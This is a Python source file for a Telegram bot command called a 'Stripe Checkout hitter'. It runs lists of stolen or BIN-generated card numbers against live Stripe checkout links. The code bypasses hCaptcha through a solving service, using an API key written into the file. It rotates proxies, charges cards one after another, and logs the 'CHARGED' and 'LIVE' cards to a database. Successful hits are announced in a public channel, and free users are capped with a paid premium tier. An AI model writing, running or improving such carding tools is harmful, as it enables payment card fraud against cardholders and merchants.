"""Stripe Checkout hitter — /hit command.

Supports single-card and multi-card (inline, reply, or .txt attachment).
"""
import time
import os
from functions.stripe_tls import solve_hcaptcha
import re
import asyncio
import random
from aiogram import Router, Bot, F
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.filters import Command
from aiogram.enums import ParseMode

NO_PREVIEW = LinkPreviewOptions(is_disabled=True)

_stop_flags: dict = {}
_pending_bin_hits: dict = {}

import database.db as db
from functions.card_utils import parse_card, parse_cards
from functions.file_input import read_attached_txt
from functions.stripe_tls import get_checkout_info, charge_card, CURRENCY_SYMBOLS
from functions.emojis import EMOJI, EMOJI_PLAIN
from functions.proxy_gate import get_user_proxy
from config import OWNER_IDS, BOT_NAME, BOT_USERNAME, FREE_DAILY_LIMIT, SYSTEM_PROXIES, OWNER_USERNAME

router = Router()


# ─── Proxy helpers ────────────────────────────────────────────────────────────

def _proxy_url(proxy_str: str) -> str | None:
    if not proxy_str:
        return None
    try:
        if "@" in proxy_str:
            auth, hostport = proxy_str.rsplit("@", 1)
            user, password = auth.split(":", 1)
            host, port = hostport.rsplit(":", 1)
            return f"http://{user}:{password}@{host}:{port}"
        parts = proxy_str.split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


async def _pick_proxy(uid: int = None) -> str | None:
    if uid:
        mode = await db.get_user_proxy_mode(uid)
        if mode == "own":
            user_proxies = await db.get_proxies(uid)
            if user_proxies:
                return _proxy_url(random.choice(user_proxies))
    system_proxy = await db.get_setting("system_proxy", "")
    if system_proxy:
        return _proxy_url(system_proxy)
    if SYSTEM_PROXIES:
        return _proxy_url(random.choice(SYSTEM_PROXIES))
    return None


# ─── URL extraction ───────────────────────────────────────────────────────────

_URL_PATTERNS = [
    r"https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'<>)]+",
    r"https?://checkout\.stripe\.com/[^\s\"\'<>)]+",
    r"https?://buy\.stripe\.com/[^\s\"\'<>)]+",
    r"https?://[^\s\"\'<>)]+/c/pay/cs_[^\s\"\'<>)]+",
    r"https?://[^\s\"\'<>)]+/pay/cs_[^\s\"\'<>)]+",
]

def _extract_url(text: str) -> str | None:
    for pat in _URL_PATTERNS:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip(".,;:")
    return None


# ─── Formatting helpers ───────────────────────────────────────────────────────

def _sym(currency: str) -> str:
    return CURRENCY_SYMBOLS.get((currency or "").lower(), "")


def _clean(text: str) -> str:
    if not text:
        return ""
    low = text.lower()
    if "card_number_invalid" in low:  return "Invalid card number"
    if "card_declined" in low:        return "Card declined"
    if "insufficient_funds" in low:   return "Insufficient funds"
    if "expired_card" in low:         return "Card expired"
    if "incorrect_cvc" in low:        return "Incorrect CVC"
    text = re.sub(r'https?://\S+', '', text)
    return text.strip()[:120]


def _status_line(result: dict) -> str:
    st = result.get("status", "")
    dc = result.get("decline_code", "")
    if st == "CHARGED":
        return f"{EMOJI['charged']} CHARGED"
    if st == "DECLINED" and dc == "incorrect_cvc":
        return f"{EMOJI['live']} LIVE"
    if st == "DECLINED":
        return f"{EMOJI['declined']} DECLINED"
    if st == "HCAPTCHA":
        return f"{EMOJI['error']} HCAPTCHA"
    if st == "3DS":
        return f"{EMOJI['3ds']} 3DS"
    if st == "TIMEOUT":
        return f"{EMOJI['error']} TIMEOUT"
    if st in ("EXPIRED", "SESSION_EXPIRED"):
        return f"{EMOJI['expired']} EXPIRED"
    if st == "NOT SUPPORTED":
        return f"{EMOJI['error']} NOT SUPPORTED"
    return f"{EMOJI['error']} {st}"


# ─── Auth helpers ─────────────────────────────────────────────────────────────

async def _is_priv(uid: int) -> bool:
    return uid in OWNER_IDS or await db.is_admin(uid)


async def _can_hit(uid: int) -> tuple[bool, str]:
    if await _is_priv(uid):
        return True, ""
    plan = await db.get_user_plan(uid)
    if plan["unlimited"]:
        return True, ""
    used = await db.get_daily_hits(uid)
    if used >= FREE_DAILY_LIMIT:
        return False, f"Daily free limit reached ({FREE_DAILY_LIMIT}). Contact {OWNER_USERNAME} for premium."
    return True, ""


# ─── Public channel broadcast ─────────────────────────────────────────────────

WATERMARK = f"{EMOJI['bolt']} STRIPE HITTER {EMOJI['bolt']}"

async def _notify_public(bot: Bot, result: dict, checkout: dict, first_name: str):
    public_ch = await db.get_setting("public_channel", "")
    if not public_ch:
        return
    dc = result.get("decline_code", "")
    if result["status"] == "CHARGED":
        status_line = f"CHARGED {EMOJI['charged']}"
    elif result["status"] == "DECLINED" and dc == "incorrect_cvc":
        status_line = f"LIVE {EMOJI['live']}"
    else:
        return
    currency = (checkout.get("currency") or "").upper()
    text = (
        f"「 STRIPE HITTER 」\n\n"
        f"User ❝ {first_name}\n"
        f"Status ❝ {status_line}\n"
        f"Currency ❝ <code>{currency}</code>\n\n"
        f"{WATERMARK}"
    )
    try:
        target = int(public_ch) if public_ch.lstrip("-").isdigit() else public_ch
        await bot.send_message(target, text, parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW)
    except Exception:
        pass


# ─── Stop callback ────────────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("stop_hit_"))
async def cb_stop_hit(query: CallbackQuery):
    try:
        target_uid = int(query.data.split("_", 2)[2])
    except (IndexError, ValueError):
        return
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    _stop_flags[target_uid] = True
    await query.answer("Stopping after this card…")


# ─── Saved-BIN callbacks ──────────────────────────────────────────────────────

@router.callback_query(F.data.startswith("sbin_cancel_"))
async def cb_sbin_cancel(query: CallbackQuery):
    try:
        target_uid = int(query.data.split("_", 2)[2])
    except (IndexError, ValueError):
        return
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    _pending_bin_hits.pop(target_uid, None)
    await query.message.delete()
    await query.answer("Cancelled.")


@router.callback_query(F.data.startswith("sbin_"))
async def cb_sbin_select(query: CallbackQuery, bot: Bot):
    parts = query.data.split("_", 2)
    if len(parts) < 3:
        return
    try:
        target_uid = int(parts[1])
    except ValueError:
        return
    bin_name = parts[2]
    if query.from_user.id != target_uid:
        return await query.answer("Not your session.", show_alert=True)
    data = _pending_bin_hits.pop(target_uid, None)
    if not data:
        return await query.answer("Session expired.", show_alert=True)
    await query.answer()

    saved_bins = await db.get_saved_bins(target_uid)
    bin_value = next((b["bin_value"] for b in saved_bins if b["name"] == bin_name), None)
    if not bin_value:
        await query.message.edit_text(f"{EMOJI['declined']} BIN not found.", parse_mode=ParseMode.HTML)
        return

    from functions.card_utils import parse_gen_input, generate_cards, parse_cards as _pc
    prefix, month, year, cvv, _ = parse_gen_input(bin_value)
    gen_cards = generate_cards(prefix, month, year, cvv, 10)
    cards = _pc("\n".join(gen_cards))
    if not cards:
        await query.message.edit_text(f"{EMOJI['declined']} Failed to generate cards.", parse_mode=ParseMode.HTML)
        return

    url = data["url"]
    msg = data["msg"]
    uid = target_uid

    can, why = await _can_hit(uid)
    if not can:
        await msg.answer(f"{EMOJI['lock']} {why}", parse_mode=ParseMode.HTML)
        return

    ok_p, proxy, err_p = await get_user_proxy(uid)
    if not ok_p:
        await msg.answer(err_p, parse_mode=ParseMode.HTML)
        return

    await query.message.edit_text(
        f"{EMOJI['hitting']} Generated <b>{len(cards)}</b> cards from BIN <b>{bin_name}</b>",
        parse_mode=ParseMode.HTML,
    )
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="⏹ Stop", callback_data=f"stop_hit_{uid}")
    ]])
    status_msg = await msg.answer(f"{EMOJI['hitting']} Fetching checkout…", parse_mode=ParseMode.HTML, reply_markup=stop_kb)
    checkout = await get_checkout_info(url, proxy)
    # Solve hCaptcha if enabled
    captcha_token = None
    if checkout.get("hcaptcha_enabled"):
        sitekey = checkout.get("hcaptcha_sitekey")
        api_key = os.getenv("CAPSOLVER_API_KEY", "CAP-209E88CDB3E089C0B60183C0EF1682BBD9B381006D928F9CAB760AC74D2538FF")
        if api_key and sitekey:
            captcha_token = solve_hcaptcha(sitekey, url, api_key)
            if captcha_token:
                checkout["hcaptcha_token"] = captcha_token
            else:
                # If solve failed, we can still try (but it'll probably timeout)
                pass
    if checkout.get("error"):
        await status_msg.edit_text(f"{EMOJI['declined']} {checkout['error']}", parse_mode=ParseMode.HTML)
        return

    merchant = checkout.get("merchant") or "Unknown"
    sym = _sym(checkout.get("currency", ""))
    price_val = checkout.get("price")
    amount_display = f"{sym}{price_val:.2f} {(checkout.get('currency') or '').upper()}".strip() if price_val else ""
    _stop_flags[uid] = False
    await _run_hit(msg=msg, bot=bot, uid=uid, cards=cards, checkout=checkout, url=url,
                   proxy=proxy, status_msg=status_msg, amount_display=amount_display, merchant=merchant,
                   captcha_token=captcha_token)


# ─── /hit command ─────────────────────────────────────────────────────────────

@router.message(Command("hit", prefix="/."))
async def cmd_hit(msg: Message, bot: Bot):
    uid = msg.from_user.id
    await db.upsert_user(uid, msg.from_user.username, msg.from_user.first_name)

    if await db.is_banned(uid):
        await msg.answer(f"{EMOJI['ban']} You are banned.", parse_mode=ParseMode.HTML)
        return

    # Collect all source text to find URL and cards
    text = msg.text or msg.caption or ""
    reply = msg.reply_to_message
    reply_text = ""
    if reply:
        reply_text = (reply.text or "") + " " + (reply.caption or "")

    # Find checkout URL
    url = _extract_url(text) or (reply_text and _extract_url(reply_text))
    if not url:
        await msg.answer(
            f"{EMOJI['question']} <b>Usage:</b>\n"
            f"<code>/hit &lt;stripe-checkout-url&gt; cc|mm|yy|cvv</code>\n"
            f"<code>/hit &lt;url&gt;</code>  +  attach a <code>.txt</code> file with cards\n\n"
            f"Supports <code>checkout.stripe.com</code> and <code>buy.stripe.com</code> links.",
            parse_mode=ParseMode.HTML, link_preview_options=NO_PREVIEW,
        )
        return

    # Strip command + URL from text to get remaining card blob
    remaining = re.sub(r"^[./]hit\s*", "", text, flags=re.IGNORECASE).strip()
    remaining = remaining.replace(url, "", 1).strip()

    cards = parse_cards(remaining)

    # Try generating from BIN-like string
    if not cards and remaining:
        try:
            from functions.card_utils import parse_gen_input, generate_cards
            parts = remaining.strip().split()
            bin_str = parts[0] if parts else ""
            gen_n = min(int(parts[1]), 25) if len(parts) >= 2 and parts[1].isdigit() else 10
            bin_clean = bin_str.split("|")[0]
            if len(bin_clean) >= 6 and bin_clean.replace("x", "").replace("X", "").isdigit():
                prefix, month, year, cvv, _ = parse_gen_input(bin_str)
                gen_cards = generate_cards(prefix, month, year, cvv, gen_n)
                cards = parse_cards("\n".join(gen_cards))
        except Exception:
            pass

    # Try .txt attachment (message or reply)
    if not cards:
        txt_blob = await read_attached_txt(msg, bot)
        if txt_blob:
            cards = parse_cards(txt_blob)

    # Try cards from reply message
    if not cards and reply:
        reply_card_text = re.sub(r'https?://\S+', '', reply_text).strip()
        if reply_card_text:
            cards = parse_cards(reply_card_text)

    # Offer saved BINs if we have a URL but no cards
    if not cards:
        saved_bins = await db.get_saved_bins(uid)
        if saved_bins:
            buttons = [
                [InlineKeyboardButton(text=b["name"], callback_data=f"sbin_{uid}_{b['name']}")]
                for b in saved_bins[:10]
            ]
            buttons.append([InlineKeyboardButton(text="Cancel", callback_data=f"sbin_cancel_{uid}")])
            _pending_bin_hits[uid] = {"url": url, "msg": msg}
            await msg.answer(
                f"{EMOJI['question']} No cards found. Pick a saved BIN to generate:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons),
                parse_mode=ParseMode.HTML,
            )
            return
        await msg.answer(
            f"{EMOJI['error']} No valid cards found.\n"
            f"Format: <code>cc|mm|yy|cvv</code>\n"
            f"Or save a BIN first: <code>/savebin name 453201</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    can, why = await _can_hit(uid)
    if not can:
        await msg.answer(f"{EMOJI['lock']} {why}", parse_mode=ParseMode.HTML)
        return

    ok_p, proxy, err_p = await get_user_proxy(uid)
    if not ok_p:
        await msg.answer(err_p, parse_mode=ParseMode.HTML)
        return

    # Cap cards to remaining daily allowance
    if not await _is_priv(uid):
        plan = await db.get_user_plan(uid)
        if not plan["unlimited"]:
            used = await db.get_daily_hits(uid)
            remaining_hits = max(0, FREE_DAILY_LIMIT - used)
            cards = cards[:remaining_hits]
    _stop_flags[uid] = False
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="⏹ Stop", callback_data=f"stop_hit_{uid}")
    ]])

    status_msg = await msg.answer(
        f"{EMOJI['hitting']} <b>Fetching checkout info…</b>",
        parse_mode=ParseMode.HTML, reply_markup=stop_kb,
    )
    checkout = await get_checkout_info(url, proxy)

    # ── Solve hCaptcha if enabled ──
    captcha_token = None
    if checkout.get("hcaptcha_enabled"):
        sitekey = checkout.get("hcaptcha_sitekey")
        api_key = os.getenv("CAPSOLVER_API_KEY", "CAP-209E88CDB3E089C0B60183C0EF1682BBD9B381006D928F9CAB760AC74D2538FF")
        if api_key and sitekey:
            captcha_token = solve_hcaptcha(sitekey, url, api_key)
            if captcha_token:
                checkout["hcaptcha_token"] = captcha_token

    if checkout.get("error"):
        _stop_flags.pop(uid, None)
        await status_msg.edit_text(
            f"{EMOJI['declined']} <b>Checkout error:</b> <code>{checkout['error']}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    merchant = checkout.get("merchant") or "Unknown"
    sym = _sym(checkout.get("currency", ""))
    price_val = checkout.get("price")
    amount_display = (
        f"{sym}{price_val:.2f} {(checkout.get('currency') or '').upper()}".strip()
        if price_val else ""
    )

    await _run_hit(
        msg=msg, bot=bot, uid=uid, cards=cards,
        checkout=checkout, url=url, proxy=proxy,
        status_msg=status_msg, amount_display=amount_display,
        merchant=merchant, captcha_token=captcha_token
    )


# ─── Core hit loop ────────────────────────────────────────────────────────────
async def _run_hit(msg, bot, uid, cards, checkout, url, proxy, status_msg, amount_display, merchant, captcha_token=None):
    total = len(cards)
    is_priv = await _is_priv(uid)
    stop_kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="⏹ Stop", callback_data=f"stop_hit_{uid}")
    ]])
    no_kb = InlineKeyboardMarkup(inline_keyboard=[])

    _stop_flags[uid] = False
    results: list[dict] = []
    card_blocks: list[str] = []
    last_edit = time.perf_counter()

    charged = live = declined = errors = 0

    for i, card in enumerate(cards):
        if _stop_flags.get(uid):
            break

        cc_full = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
        is_last = (i == total - 1)

        # Show "hitting" status every ~1 s
        now_ts = time.perf_counter()
        if (now_ts - last_edit) >= 1.0 or i == 0:
            try:
                await status_msg.edit_text(
                    f"{EMOJI['hitting']} <b>Hitting</b> {i + 1}/{total}\n"
                    f"Merchant: <code>{merchant}</code>\n"
                    f"Amount:   <code>{amount_display or 'N/A'}</code>\n"
                    f"Card:     <code>{cc_full}</code>",
                    parse_mode=ParseMode.HTML, reply_markup=stop_kb,
                )
                last_edit = time.perf_counter()
            except Exception:
                pass

        try:
            result = await asyncio.wait_for(
                charge_card(card, checkout, proxy, hcaptcha_token=captcha_token),
                timeout=50
            )
        except asyncio.TimeoutError:
            result = {"card": cc_full, "status": "FAILED", "response": "Timeout", "decline_code": "", "time": 50.0}
        except Exception as e:
            result = {"card": cc_full, "status": "FAILED", "response": str(e)[:50], "decline_code": "", "time": 0.0}

        results.append(result)

        st = result.get("status", "")
        dc = result.get("decline_code", "")
        resp_clean = _clean(result.get("response", ""))
        t_s = result.get("time", 0.0)

        is_charged = (st == "CHARGED")
        is_live = (st == "DECLINED" and dc == "incorrect_cvc")
        is_hcaptcha = (st == "HCAPTCHA")

        # Tally counters
        if is_charged:
            charged += 1
        elif is_live:
            live += 1
        elif is_hcaptcha:
            errors += 1            # treat as an error, not a live card
        elif st in ("DECLINED", "NOT SUPPORTED"):
            declined += 1
        else:
            errors += 1

        # Log hits to DB
        if is_charged:
            await db.log_check(uid, cc_full, url, merchant, amount_display, "CHARGED", result.get("response", ""), t_s)
        elif is_live:
            await db.log_check(uid, cc_full, url, merchant, amount_display, "LIVE", result.get("response", ""), t_s)

        # Count toward daily limit for ALL card attempts
        if not is_priv:
            await db.increment_daily_hits(uid)

        # Notify public channel on hits
        if is_charged or is_live:
            await _notify_public(bot, result, checkout, msg.from_user.first_name)

        # Build card result line
        sl = _status_line(result)
        block = (
            f"{sl}\n"
            f"Card: <code>{cc_full}</code>\n"
            f"Reply: <code>{resp_clean}</code>\n"
            f"Time: <code>{t_s}s</code>"
        )
        card_blocks.append(block)

        # Update progress message
        now = time.perf_counter()
        if is_last or (now - last_edit) >= 1.5:
            last_edit = now
            label = "COMPLETE ✓" if is_last else "Running…"
            total_elapsed = round(sum(r.get("time", 0) for r in results), 2)
            header = (
                f"{EMOJI['hitting']} <b>Stripe Checkout — {label}</b>\n"
                f"Merchant: <code>{merchant}</code>\n"
                f"Amount:   <code>{amount_display or 'N/A'}</code>\n"
                f"Progress: <code>{i + 1}/{total}</code>\n"
                f"{EMOJI['charged']} {charged} CHARGED · {EMOJI['live']} {live} LIVE · "
                f"{EMOJI['declined']} {declined} DEC · {EMOJI['error']} {errors} ERR\n"
                f"━━━━━━━━━━━━━━\n"
            )
            visible = card_blocks[-8:]
            body = header + "\n\n".join(visible) + f"\n\nTotal time: <code>{total_elapsed}s</code>"
            if len(body) > 4000:
                body = body[:3990] + "…"
            try:
                await status_msg.edit_text(
                    body, parse_mode=ParseMode.HTML,
                    reply_markup=no_kb if is_last else stop_kb,
                )
            except Exception:
                pass

        # Stop early if session expired or single-card charged
        if st in ("EXPIRED", "SESSION_EXPIRED") or (is_charged and total == 1):
            break

    _stop_flags.pop(uid, None)